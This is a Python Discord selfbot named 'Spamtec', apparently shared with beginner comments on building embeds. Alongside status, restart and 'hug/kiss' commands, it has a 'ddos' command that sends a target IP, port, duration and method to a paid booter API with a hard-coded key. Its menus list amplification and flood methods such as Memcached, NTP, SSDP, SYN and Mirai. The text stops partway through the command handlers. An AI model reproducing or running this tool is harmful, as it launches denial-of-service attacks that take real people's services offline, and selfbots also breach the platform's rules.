
# How to made by cri <
# How to make an embedded message
# first we need our commands list
# if commands[0] == "name":  <-- this is reading the user input from the discord client
# await message.delete()   <-- This is waiting for our message to auto-delete to display our embedded menu/message
#  container = discord.Embed(title="TEXT INPUT HERE ", color=HEXVALUE)  <-- this is creating our container
# In other words its our "base" in which we select our embedded menu title and color. Picture: http://prntscr.com/o8p2oj
# by inputting ** before and after our text input it creates a BOLD text/input. 
# by inputting __ before and after our text input and or ** it underlines our text/input
# container.set_thumbnail(url="URL/LINK")  <-- this allows us to add a "thumbnail", basically just a picture in the top right corner of our embedded menu/container
# container.set_author(name="TEXT INPUT", icon_url="ICON URL/LINK")  <-- this is our "author" title, it allows us to display a message and ICON above our title
# container.add_field(name="TEXT INPUT", value="TEXT INPUT", inline=True)  <-- this is adding another field input, name= is our title for said field.
# value= the text under our field title, inline=True/False < this allows us to either stick fields within the same line and or display this in a seperate line
# picture: http://prntscr.com/o8p5an
# container.set_footer(text="TEXT INPUT", icon_url="URL/LINK")   <-- this is basically the same as the "author" field, except its only displayed at the bottom.
# await channel.send(embed=container)   <-- this is our container EMBED, this allows our message to be embedded and sent sucessfully. must add this under our field
# 
# -*- coding: utf-8 -*-

token = " PASTE YOUR TOKEN HERE "

import discord
import asyncio
import subprocess
import requests
import json
import sys
import os
import psutil
import logging
import time
from colorama import Fore, Back, Style
from colorama import init as cinit

cinit()
from socket import gethostbyname
#/////////////////////////////////////////////////////
if len(sys.argv[0]) != 0:
    print("usage: python "+ sys.argv[0] +"")
#/////////////////////////////////////////////////////
# Subprocess:Subshell defined as "cri": we are using this for system commands c;
def cri(cmd):
    subprocess.call(cmd, shell=True)
#/////////////////////////////////////////////////////
# Replace Lines within file defined with "jack": we are using this for prefix changes c;
def jack(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()
#/////////////////////////////////////////////////////
# Bot restart defined as "bot_restart": we are using this to restart our bot (';
def restart_program():
    """Restarts the current program, with file objects and descriptors
       cleanup
    """

    python = sys.executable
    os.execl(python, python, "\"{}\"".format(sys.argv[0]))
#/////////////////////////////////////////////////////

client = discord.Client()

cri('cls')
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Welcome To The"+Fore.RED+" Spamtec "+Fore.WHITE+"Selfbot!")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Version: "+Fore.RED+"1.0.1")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Developer("+Fore.RED+"s"+Fore.WHITE+"): "+Fore.RED+"Cri#4337")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Lets Go Ahead And Setup!")
time.sleep(2)
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
prefix = input(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Enter Desired Prefix: "+Fore.RED +"")
print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
time.sleep(2)
cri('cls')

@client.event
async def on_ready():
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                     Alright! Now that we've set our Prefix")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                     Its time To grab our UserInformation!")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                           Loading Username..")
            time.sleep(2)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Welcome, "+ Style.BRIGHT + Fore.RED + Back.BLACK +""+ client.user.name +"!")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Discord Tag Number: "+ Style.BRIGHT + Fore.RED + Back.BLACK +"#"+ client.user.discriminator+"")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Full Discord Name:"+ Style.BRIGHT + Fore.RED + Back.BLACK + ""+ client.user.name +"#"+ client.user.discriminator+"")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
            time.sleep(2)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Grabbing ClientID...")
            time.sleep(2)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         ClientID Succesfully Logged!")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         ClientID:"+ Style.BRIGHT + Fore.RED + Back.BLACK +"", client.user.id)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
            time.sleep(2)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                         Now generating main banner..")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                                              Hope you enjoy!")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")

            time.sleep(2)
            cri('cls')
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ╔═══════════════════════════════╗")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║ "+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"New Tools Added: "+ Style.BRIGHT + Fore.RED + Back.BLACK + "4            "+ Style.BRIGHT + Fore.RED + Back.BLACK +"║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║ "+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"Modules Loaded:"+ Style.BRIGHT + Fore.RED + Back.BLACK +" 50            "+ Style.BRIGHT + Fore.RED + Back.BLACK +"║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║ "+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"Command Prefix:"+ Style.BRIGHT + Fore.RED + Back.BLACK +" "+prefix+"             ║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ╠═══════════════════════════════╣")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║"+ Style.BRIGHT + Fore.WHITE + Back.BLACK + "       Developer List          "+ Style.BRIGHT + Fore.RED + Back.BLACK + "║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║"+ Style.BRIGHT + Fore.WHITE + Back.BLACK + "    Discords And Twitters      "+ Style.BRIGHT + Fore.RED + Back.BLACK + "║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ╠═══════════════════════════════╣")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║ "+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"      Georgia Cri#4337        "+ Style.BRIGHT + Fore.RED + Back.BLACK +"║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ║ "+ Style.BRIGHT + Fore.WHITE + Back.BLACK +" twitter.com/flexingonlamers  "+ Style.BRIGHT + Fore.RED + Back.BLACK +"║")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                      ╚═══════════════════════════════╝")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +'                                       Logged in as:', client.user.name +'#'+ client.user.discriminator)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +'                                       USERID:', client.user.id)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +'                                       Discord version:', discord.__version__)
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")
            print(Style.BRIGHT + Fore.RED + Back.BLACK +"                                             Quick Tools Listed Below:")
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"                         ["+Style.BRIGHT + Fore.RED + Back.BLACK +"+"+Style.BRIGHT + Fore.WHITE + Back.BLACK +"]"+ Style.BRIGHT + Fore.RED + Back.BLACK +"-------------------------------------------------------"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"["+ Style.BRIGHT + Fore.RED + Back.BLACK +"+"+ Style.BRIGHT + Fore.WHITE + Back.BLACK +"]")

# Global Variables
logging_enabled = False
Red = 0xFF0000
Orange = 0xFFB100
Yellow = 0xFFB100
Lime = 0xA3FF00
Green = 0x34F000
Cyan = 0x00FFE2
Blue = 0x3F00FF
Purple = 0xC600FF
Pink = 0xFF00EF
Magenta = 0xFF0092

# Define commands
@client.event
async def on_message(message):
    global prefix
    prefix = prefix
    if message.author == client.user:
        commands = []
        z = 0
        for index, a in enumerate(message.content):
            if a == " ":
                commands.append(message.content[z:index])
                z = index + 1
        commands.append(message.content[z:])

        channel = message.channel
################################################################################################################################

        # help menu
        if commands[0] == ""+prefix+"help":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+Style.BRIGHT + Fore.RED + Back.BLACK + prefix+"help")
            await message.delete()
            container = discord.Embed(title="__**Spamtec v1.0.1 SelfBot!**__", colour=0xFF0400)
            container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
            container.set_author(name="Developed By Georgia Cri!", icon_url="https://i.imgur.com/5bd3F42.png")
            container.add_field(name="**Account Tools**", value="Usage:"+prefix+"account", inline=True)
            container.add_field(name="**Menu Tools**", value="Usage:"+prefix+"menutools", inline=True)
            container.add_field(name="**Status Tools**", value="Usage:"+prefix+"stattools", inline=True)
            container.add_field(name="**Terminal Tools**", value="Usage:"+prefix+"terminal", inline=True)
            container.add_field(name="**DDoS Tools**", value="Usage:"+prefix+"ddos", inline=True)
            container.add_field(name="**Prebuilt Messages**", value="Usage:"+prefix+"messages", inline=True)
            container.add_field(name="**The Homies**", value="Usage:"+prefix+"homies", inline=True)
            container.add_field(name="**Image List**", value="Usage:"+prefix+"images", inline=True)
            container.add_field(name="**Link List**", value="Usage:"+prefix+"links", inline=True)
            container.add_field(name="**Available Games**", value="Usage:"+prefix+"games", inline=True)
            container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)

################################################################################################################################

				
################################################################################################################################

        # messages menu
        if commands[0] == ""+prefix+"messages":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix+"messages")
                await message.delete()
                container = discord.Embed(title="__**Spamtec Message List**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**Head pat a user!**", value="Usage:"+prefix+"patpat [USER]", inline=True)
                container.add_field(name="**Hugs a user <3**", value="Usage:"+prefix+"hug [USER]", inline=True)
                container.add_field(name="**Kisses a user c;**", value="Usage:"+prefix+"kiss [USER]", inline=True)
                container.add_field(name="**Licks a user c;**", value="Usage:"+prefix+"lick [USER]", inline=True)
                container.add_field(name="**Tickle a user c;**", value="Usage:"+prefix+"tickle [USER]", inline=True)
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

        if commands[0] == ""+prefix+"patpat":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0xFF0400
                    e.title='{0} has patted! {1}'.format(client.user, user)
                    e.set_image(url="https://cdn.discordapp.com/attachments/593189193295986689/593397390351007764/pat-r12R1kYPZ.gif")
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (kiss){1}".format(Fore.GREEN, Fore.RESET))
				
        if commands[0] == ""+prefix+"hug":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0xFF0400
                    e.title='{0} has hugged {1}'.format(client.user, user)
                    e.set_image(url="https://i.redd.it/eaz8jecdet511.gif")
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (hug){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"kiss":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0xFF0400
                    e.title='{0} has kissed {1}'.format(client.user, user)
                    e.set_image(url="https://uploads.disquscdn.com/images/1350a495b972166f5d18852ceb20fe33ef2351742ecc88457b47f242b0e2178b.gif")
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (kiss){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"lick":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0xFF0400
                    e.title='{0} has Licked! {1}'.format(client.user, user)
                    e.set_image(url="https://media1.tenor.com/images/efd46743771a78e493e66b5d26cd2af1/tenor.gif?itemid=14002773")
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (Lick){1}".format(Fore.GREEN, Fore.RESET))

        if commands[0] == ""+prefix+"tickle":
            await message.delete()
            if (message.mentions.__len__()>0):
                for user in message.mentions:
                    e = discord.Embed()
                    e.color=0xFF0400
                    e.title='{0} has Tickled! {1}'.format(client.user, user)
                    e.set_image(url="https://media.tenor.com/images/d6a0512280a84726ff8ac695a37eadbe/tenor.gif")
                    await channel.send(embed=e)
                    print("{0}[+] Used Fun Command (Tickle){1}".format(Fore.GREEN, Fore.RESET))

################################################################################################################################

        # status tools menu
        if commands[0] == ""+prefix+"stattools":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"stattools")
            await message.delete()
            container = discord.Embed(title="__**Spamtec StatTool List**__", color=0xFF0400)
            container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
            container.add_field(name="**Playing Status Changer**", value="Usage:"+prefix+"playing [NAME/WORD]", inline=False)
            container.add_field(name="**Watching Status Changer**", value="Usage:"+prefix+"watching [NAME/WORD]", inline=False)
            container.add_field(name="**Streaming Status Changer**", value="Usage:"+prefix+"streaming [QUOTEDWORD] [LINK]", inline=False)
            container.add_field(name="**Reset Status**", value="Usage:"+prefix+"resetstatus", inline=False)
            container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)

        # Playing $INPUT
        if commands[0] == ""+prefix+"playing":
                msg = message.content.split(""+prefix+"playing ", 1)
                name = msg[1]
                await message.delete()
                await client.change_presence(status=discord.Status.dnd, activity=discord.Activity(name=name, type=discord.ActivityType.playing, details="Doin Drugs", state="Created with love By Cri#4344 c;", assets="https://i.imgur.com/5bd3F42.png"))
                container = discord.Embed(title="__**Status Tool**__", color=0xFF0400)
                container.add_field(name="**Status set to:**", value="Playing "+name+".")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

        # Streaming $INPUT
        if commands[0] == ""+prefix+"streaming":
                if len(commands) <= 3:
                        msg = message.content.split(""+prefix+"streaming ", 1)
                        args = msg[1].split(" http", 1)
                        name = args[0]
                        url = "http"+args[1]
                        await message.delete()
                        await client.change_presence(status=discord.Status.dnd, activity=discord.Streaming(name=name, url=url))
                        container = discord.Embed(title="__**Status Tool**__", color=0xFF0400)
                        container.add_field(name="**Status set to:**", value="Streaming "+name+".")
                        container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                        await channel.send(embed=container)
                else:
                        await message.delete()
                        container = discord.Embed(title="__**Status Tool**__", color=0xFF0400)
                        container.add_field(name="**Usage:**", value=""+prefix+"streaming [name] [url]")
                        container.add_field(name="**Example:**", value=""+prefix+"streaming 'video game' https://twitch.tv/streamer", inline=False)
                        container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                        await channel.send(embed=container)

        # Watching $INPUT
        if commands[0] == ""+prefix+"watching":
                msg = message.content.split(""+prefix+"watching ", 1)
                name = msg[1]
                await message.delete()
                await client.change_presence(status=discord.Status.dnd, activity=discord.Activity(name=name, type=discord.ActivityType.watching, details="Spamtec v1.0.1 Selfbot", state="Created with love By Cri#4344 c;"))
                await channel.send("Status set to: \"Watching "+name+"\".")

        # Reset Presence
        if commands[0] == ""+prefix+"resetstatus":
                await message.delete()
                await client.change_presence(status=discord.Status.dnd)
                await channel.send("Status reset.")

################################################################################################################################

        # Terminal tools menu
        if commands[0] == ""+prefix+"terminal":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"terminal")
            await message.delete()
            container = discord.Embed(title="__**CSpamtec Terminal List**__", color=0xFF0400)
            container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
            container.add_field(name="**Restart Bot**", value="Usage:"+prefix+"restart", inline=True)
            container.add_field(name="**Stop Bot**", value="Usage:"+prefix+"stop", inline=True)
            container.add_field(name="**Clear Terminal**", value="Usage:"+prefix+"clear ", inline=True)
            container.add_field(name="**Change Bot Prefix**", value="Usage:"+prefix+"prefix [PREFIX]", inline=True)
            container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
            await channel.send(embed=container)

        if commands[0] == ""+prefix+"clear":
            await message.delete()
            cri('cls')
            time.sleep(4)
            await channel.send("Terminal Cleared!")

        if commands[0] == ""+prefix+"restart":
            await message.delete()
            container = discord.Embed(title="__**Restarting Bot!**__", color=0xFF0400)
            await channel.send(embed=container)
            await channel.send("```css\nBot Restarting In [5]```")
            time.sleep(1)
            await channel.send("```css\nBot Restarting In [4]```")
            time.sleep(1)
            await channel.send("```css\nBot Restarting In [3]```")
            time.sleep(1)
            await channel.send("```css\nBot Restarting In [2]```")
            time.sleep(1)
            await channel.send("```css\nBot Restarting In [1]```")
            time.sleep(1)
            await channel.send("```Restarting!```")
            restart_program()

        if commands[0] == ""+prefix+"stop":
            await message.delete()
            print("Stopping Bot!")
            time.sleep(1)
            print("Time Left: 10")
            time.sleep(1)
            print("Time Left: 9")
            time.sleep(1)
            print("Time Left: 8")
            time.sleep(1)
            print("Time Left: 7")
            time.sleep(1)
            print("Time Left: 6")
            time.sleep(1)
            print("Time Left: 5")
            time.sleep(1)
            print("Time Left: 4")
            time.sleep(1)
            print("Time Left: 3")
            time.sleep(1)
            print("Time Left: 2")
            time.sleep(1)
            print("Time Left: 1")
            time.sleep(1)
            print("Shutting Down! - Created By Cri#4337")
            sys.exit()

        if commands[0] == ""+prefix+"prefix":
          	prefix = commands[1]
################################################################################################################################
#How to use the >embed command:
#Example: >embed title=test this | description=some words | color=3AB35E | field=name=test value=test
#You do NOT need to specify every property, only the ones you want.
#All properties and the syntax (put your custom stuff in place of the <> stuff):
#title=<words>
#description=<words>
#color=<hex_value>
#image=<url_to_image> (must be https)
#thumbnail=<url_to_image>
#author=<words> **OR** author=name=<words> icon=<url_to_image>
#footer=<words> **OR** footer=name=<words> icon=<url_to_image>
#field=name=<words> value=<words> (you can add as many fields as you want)
#ptext=<words>
#NOTE: After the command is sent, the bot will delete your message and replace it with the embed. Make sure you have it saved or else you'll have to type it all again if the embed isn't how you want it.
#PS: Hyperlink text like so: [text](https://www.whateverlink.com)
#PPS: Force a field to go to the next line with the added parameter inline=False
################################################################################################################################
       
        # Attack Input/Output
        if commands[0] == ""+prefix+"ddos":
            print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos")
            if len(commands) == 5:
                await message.delete()
                api = requests.get("https://api.supremesecurityteam.com/index.php?page=Api&key=thgbuejeb6k6xe0&host="+commands[1]+"&port="+commands[2]+"&time="+commands[3]+"&method="+commands[4].upper())
                api2 = requests.get(""+supremeapi+""+supremeapi2+"&host="+commands[1]+"&port="+commands[2]+"&time="+commands[3]+"&method="+commands[4].upper())
                container = discord.Embed(title="__**Attack Started!**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="IP", value=commands[1], inline=True)
                container.add_field(name="Port:", value=commands[2], inline=True)
                container.add_field(name="Time:", value=commands[3], inline=True)
                container.add_field(name="Method:", value=commands[4], inline=True)
                #container.add_field(name="**Open Ports:**:", value=""+api4.text+"", inline=False)
                #container.add_field(name="**Geolocation Results:**", value="c;", inline=False)
                #container.add_field(name="**IP:**", value=commands[1], inline=False)
                #if data["reverse"] != "":
                #        container.add_field(name="**Hostname:**", value=data["reverse"], inline=False)
                #container.add_field(name="**ISP:**", value=data["as"], inline=False)
                #container.add_field(name="**City**:", value=data["city"], inline=True)
                #container.add_field(name="**State/Region:**", value=data["regionName"], inline=True)
                #container.add_field(name="**ZIP:**", value=data["zip"], inline=True)
                #container.add_field(name="**Country:**", value=data["country"], inline=True)
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                print("=============================================================")
                print("User:", client.user.name +'#'+ client.user.discriminator, "Ran tool: "+prefix+"ddos\ninput="+prefix+"ddos "+commands[1]+" "+commands[2]+" "+commands[3]+" "+commands[4]+"")
                print("=============================================================")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "methodlist":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client:"+ Style.BRIGHT + Fore.RED + Back.BLACK +prefix+"ddos methodlist")
                await message.delete()
                container = discord.Embed(title="__**Spamtec Attack API**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**UDP Methods**", value="Usage:"+prefix+"ddos udp", inline=True)
                container.add_field(name="**TCP Methods**", value="Usage:"+prefix+"ddos tcp", inline=True)
                container.add_field(name="**Supreme Methods**", value="Usage:"+prefix+"ddos supreme", inline=True)
                container.add_field(name="**Arceus Methods**", value="Usage:"+prefix+"ddos arceus", inline=True)
                container.add_field(name="**Mirai Methods**", value="Usage:"+prefix+"ddos mirai", inline=True)
                container.add_field(name="**C2 Methods**", value="Usage:"+prefix+"ddos c2", inline=True)
                container.add_field(name="**Reflection Methods**", value="Usage:"+prefix+"ddos reflection", inline=True)
                container.add_field(name="**Bandwidth Methods**", value="Usage:"+prefix+"ddos bandwidth", inline=True)
                container.add_field(name="**Yubina Methods**", value="Usage:"+prefix+"ddos yubina", inline=True)
                container.add_field(name="**Custom Methods**", value="Usage:"+prefix+"ddos custom", inline=True)
                container.add_field(name="**Connected APIs**", value="Usage:"+prefix+"ddos apis", inline=True)
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "apis":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos apis")
                await message.delete()
                container = discord.Embed(title="__**API Connection List**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**Connected:**", value="supremesecurityteam.api Connected APIs:[**2**]", inline=True)
                container.add_field(name="**Connected:**", value="arceus.cf.api Connected APIs:[**2**]", inline=True)
                container.add_field(name="**Connected:**", value="defcon.nl.api Connected APIs:[**0**]", inline=True)
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "udp":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos udp")
                await message.delete()
                container = discord.Embed(title="__**UDP Attack Methods**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**UDP Methods**", value="UDP-ABUSE\nSUDP\nDNS\nMDNS\nLDAP", inline=True)
                container.add_field(name="**UDP Methods**", value="MSSQL\nMEMCACHED\nNETBIOS\nNTP\nNTPv2\nSNMP\nSSDP", inline=True)
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)

            if len(commands) == 2 and commands[1] == "tcp":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos tcp")
                await message.delete()
                container = discord.Embed(title="__**TCP Attack Methods**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**TCP Methods**", value="TCP-ABUSE\nTCP-ACK\nTCP-FIN\nTCP-PSH\nTCP-RST\nTCP-SYN\nTCP-SEW\nTCP-URG\nXMAS\nZAP\nTELNET\nTCP-XMAS")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)
               
            if len(commands) == 2 and commands[1] == "supreme":
                print(Style.BRIGHT + Fore.WHITE + Back.BLACK +"Running CMD Through Discord Client: "+ Style.BRIGHT + Fore.RED + Back.BLACK + prefix +"ddos supreme")
                await message.delete()
                container = discord.Embed(title="__**Supreme Attack Methods**__", color=0xFF0400)
                container.set_thumbnail(url="https://cdn.discordapp.com/attachments/640702110819811338/646075433779068928/Spamtec.png")
                container.add_field(name="**Supreme Methods**", value="DNS\nNTP\nSNMP\nCLDAP\nMEMCACHE\nUDPKILL\nUDPRAND\nXSYN\nXACK\nXMAS\nTCP-AMP\nSOURCE\nTCPKILL\nARMA3\nOpenVPN\nUBNT\nPPTP\nGRENADE\nIPX\nVOX\nSWTCP\nSETCP\nOVHUDP")
                container.set_footer(text="Created with love By Cri#4344 c;", icon_url="https://i.imgur.com/5bd3F42.png")
                await channel.send(embed=container)
                
            if len(commands) == 2 and commands[1] == "reflection":
